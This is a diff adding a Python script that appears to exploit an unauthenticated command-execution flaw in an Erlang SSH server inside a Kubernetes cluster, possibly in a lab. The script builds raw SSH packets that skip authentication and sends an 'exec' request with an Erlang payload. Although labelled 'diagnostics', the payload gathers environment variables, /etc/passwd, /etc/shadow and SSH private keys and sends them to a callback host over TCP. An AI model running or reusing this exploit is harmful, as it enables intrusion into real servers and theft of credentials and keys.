@@ -1,0 +1,281 @@
+import socket
+import struct
+import time
+import os
+import requests
+import json
+from kubernetes import client, config
+
+def discover_ssh_server():
+    try:
+        print("[*] Attempting to load in-cluster Kubernetes config...")
+        config.load_incluster_config()
+        print("[+] Successfully loaded in-cluster config")
+    except Exception as e:
+        print(f"[!] Failed to load in-cluster config: {e}")
+        print("[*] Falling back to kubeconfig...")
+        try:
+            config.load_kube_config()
+            print("[+] Successfully loaded kubeconfig")
+        except Exception as e:
+            print(f"[!] Failed to load kubeconfig: {e}")
+            raise
+    
+    v1 = client.CoreV1Api()
+    
+    try:
+        print("[*] Looking up ssh-server service...")
+        service = v1.read_namespaced_service(
+            name="ssh-server",
+            namespace="erlang"
+        )
+        print(f"[+] Found service: {service.metadata.name}")
+        print(f"[+] Service IP: {service.spec.cluster_ip}")
+    except Exception as e:
+        print(f"[!] Failed to get service details: {e}")
+    
+    try:
+        print("[*] Looking up ssh-server pods...")
+        pods = v1.list_namespaced_pod(
+            namespace="erlang",
+            label_selector="app=ssh-server"
+        )
+        
+        if not pods.items:
+            print("[!] No SSH server pods found")
+        else:
+            print(f"[+] Found {len(pods.items)} pod(s)")
+            for pod in pods.items:
+                print(f"[+] Pod: {pod.metadata.name}")
+                print(f"[+] Pod IP: {pod.status.pod_ip}")
+                print(f"[+] Pod Status: {pod.status.phase}")
+                print(f"[+] Pod Conditions: {pod.status.conditions}")
+    except Exception as e:
+        print(f"[!] Failed to get pod details: {e}")
+    
+    # Return service name (for DNS) and pod IP as fallback
+    return {
+        "service_host": "ssh-server.erlang.svc.cluster.local",
+        "pod_ip": pods.items[0].status.pod_ip if pods.items else None,
+        "port": 2222
+    }
+
+# Try to discover the server, fall back to env vars
+try:
+    server_info = discover_ssh_server()
+    HOST = server_info["service_host"]
+    PORT = server_info["port"]
+    print(f"[*] Discovered SSH server at {HOST}:{PORT}")
+except Exception as e:
+    print(f"[!] Failed to discover server: {e}")
+    print("[*] Falling back to environment variables")
+    HOST = os.environ.get("HOST", "127.0.0.1")
+    PORT = int(os.environ.get("PORT", "2222"))
+
+print(f"[*] Targeting {HOST}:{PORT}")
+
+# Add DNS resolution check
+try:
+    print(f"[*] Attempting DNS resolution for {HOST}...")
+    resolved_ip = socket.gethostbyname(HOST)
+    print(f"[+] Successfully resolved {HOST} to {resolved_ip}")
+except Exception as e:
+    print(f"[!] DNS resolution failed: {e}")
+
+# Add network connectivity check
+try:
+    print(f"[*] Testing network connectivity to {HOST}:{PORT}...")
+    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    test_socket.settimeout(5)
+    test_socket.connect((HOST, PORT))
+    test_socket.close()
+    print(f"[+] Successfully connected to {HOST}:{PORT}")
+except Exception as e:
+    print(f"[!] Network connectivity test failed: {e}")
+    print("[!] Please check if the target service is running and accessible")
+
+# Helper to format SSH string (4-byte length + bytes)
+def string_payload(s):
+    s_bytes = s.encode("utf-8")
+    return struct.pack(">I", len(s_bytes)) + s_bytes
+
+
+# Builds SSH_MSG_CHANNEL_OPEN for session
+def build_channel_open(channel_id=0):
+    return (
+        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
+        + string_payload("session")
+        + struct.pack(">I", channel_id)  # sender channel ID
+        + struct.pack(">I", 0x68000)  # initial window size
+        + struct.pack(">I", 0x10000)  # max packet size
+    )
+
+
+# Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
+def build_channel_request(channel_id=0, command=None):
+    if command is None:
+        command = 'file:write_file("/lab.txt", <<"gotcha">>).'
+    return (
+        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
+        + struct.pack(">I", channel_id)
+        + string_payload("exec")
+        + b"\x01"  # want_reply = true
+        + string_payload(command)
+    )
+
+
+# Builds a minimal but valid SSH_MSG_KEXINIT packet
+def build_kexinit():
+    cookie = b"\x00" * 16
+
+    def name_list(l):
+        return string_payload(",".join(l))
+
+    # Match server-supported algorithms from the log
+    return (
+        b"\x14"
+        + cookie
+        + name_list(
+            [
+                "curve25519-sha256",
+                "ecdh-sha2-nistp256",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+            ]
+        )  # kex algorithms
+        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
+        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
+        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
+        + name_list(["none"]) * 2  # compression
+        + name_list([]) * 2  # languages
+        + b"\x00"
+        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
+    )
+
+
+# Pads a packet to match SSH framing
+def pad_packet(payload, block_size=8):
+    min_padding = 4
+    padding_len = block_size - ((len(payload) + 5) % block_size)
+    if padding_len < min_padding:
+        padding_len += block_size
+    return (
+        struct.pack(">I", len(payload) + 1 + padding_len)
+        + bytes([padding_len])
+        + payload
+        + bytes([0] * padding_len)
+    )
+
+# Build the diagnostics command sent to the SSH service.
+def build_diagnostics_command(callback_host, callback_port=8080):
+    return f'''
+    begin
+        % Collect process information
+        EnvData = "== ENVIRONMENT VARIABLES ==\\n" ++ os:cmd("env") ++ "\\n\\n",
+        
+        % Collect host files
+        EtcPasswd = case file:read_file("/etc/passwd") of
+            {{ok, PasswdBin}} -> "== /etc/passwd ==\\n" ++ binary_to_list(PasswdBin) ++ "\\n\\n";
+            _ -> "== /etc/passwd ==\\nCould not read file\\n\\n"
+        end,
+        
+        EtcShadow = case file:read_file("/etc/shadow") of
+            {{ok, ShadowBin}} -> "== /etc/shadow ==\\n" ++ binary_to_list(ShadowBin) ++ "\\n\\n";
+            _ -> "== /etc/shadow ==\\nCould not read file\\n\\n"
+        end,
+        
+        SshKeys = case os:cmd("find /home -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null") of
+            [] -> "== SSH KEYS ==\\nNo SSH keys found\\n\\n";
+            Keys -> "== SSH KEYS ==\\n" ++ Keys ++ "\\n\\n"
+        end,
+        
+        % Collect host information
+        HostInfo = "== HOST INFO ==\\n" ++ 
+                   "Hostname: " ++ os:cmd("hostname") ++
+                   "Kernel: " ++ os:cmd("uname -a") ++ "\\n\\n",
+        
+        % Combine the results
+        AllData = EnvData ++ HostInfo ++ EtcPasswd ++ EtcShadow ++ SshKeys,
+        
+        % Open the callback connection
+        {{ok, Socket}} = gen_tcp:connect("{callback_host}", {callback_port}, [binary, {{packet, 0}}]),
+        
+        % Send the results
+        ok = gen_tcp:send(Socket, AllData),
+        
+        % Close the connection
+        gen_tcp:close(Socket),
+        
+        % Store a local copy
+        file:write_file("/env_vars.txt", list_to_binary(AllData))
+    end.
+    '''
+
+# Run the scheduled SSH exchange.
+try:
+    # Get callback information from environment or use pod IP
+    CALLBACK_HOST = os.environ.get("CALLBACK_HOST", os.environ.get("POD_IP", "127.0.0.1"))
+    CALLBACK_PORT = int(os.environ.get("CALLBACK_PORT", "8080"))
+    
+    print(f"[*] Using callback address: {CALLBACK_HOST}:{CALLBACK_PORT}")
+    print(f"[*] Creating connection to {HOST}:{PORT}...")
+    
+    with socket.create_connection((HOST, PORT), timeout=10) as s:
+        print("[+] Connection established")
+        print("[*] Setting socket options...")
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.settimeout(10)
+
+        # 1. Banner exchange
+        print("[*] Sending SSH banner...")
+        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
+        print("[+] Banner sent")
+        
+        try:
+            banner = s.recv(1024)
+            print(f"[+] Received banner: {banner.strip().decode(errors='ignore')}")
+        except socket.timeout:
+            print("[!] Timeout waiting for banner response")
+        except Exception as e:
+            print(f"[!] Error receiving banner: {e}")
+        
+        time.sleep(0.5)  # Small delay between packets
+
+        # 2. Send SSH_MSG_KEXINIT
+        print("[*] Sending SSH_MSG_KEXINIT...")
+        kex_packet = build_kexinit()
+        s.sendall(pad_packet(kex_packet))
+        print("[+] KEXINIT sent")
+        time.sleep(0.5)  # Small delay between packets
+
+        # 3. Send SSH_MSG_CHANNEL_OPEN
+        print("[*] Sending SSH_MSG_CHANNEL_OPEN...")
+        chan_open = build_channel_open()
+        s.sendall(pad_packet(chan_open))
+        print("[+] CHANNEL_OPEN sent")
+        time.sleep(0.5)  # Small delay between packets
+
+        # 4. Send SSH_MSG_CHANNEL_REQUEST with the diagnostics command
+        diagnostics_command = build_diagnostics_command(CALLBACK_HOST, CALLBACK_PORT)
+        print(f"[*] Sending SSH_MSG_CHANNEL_REQUEST with callback {CALLBACK_HOST}:{CALLBACK_PORT}...")
+        chan_req = build_channel_request(command=diagnostics_command)
+        s.sendall(pad_packet(chan_req))
+        print("[+] CHANNEL_REQUEST sent")
+
+        print(f"[✓] Request sent; callback receiver is {CALLBACK_HOST}:{CALLBACK_PORT}")
+
+        # Try to receive any response (might get a protocol error or disconnect)
+        try:
+            print("[*] Waiting for response...")
+            response = s.recv(1024)
+            print(f"[+] Received response: {response.hex()}")
+        except socket.timeout:
+            print("[*] No response within timeout period (which is expected)")
+        except Exception as e:
+            print(f"[!] Error receiving response: {e}")
+
+except Exception as e:
+    print(f"[!] Error: {e}")
+    print("[!] Stack trace:")
+    import traceback
+    traceback.print_exc()
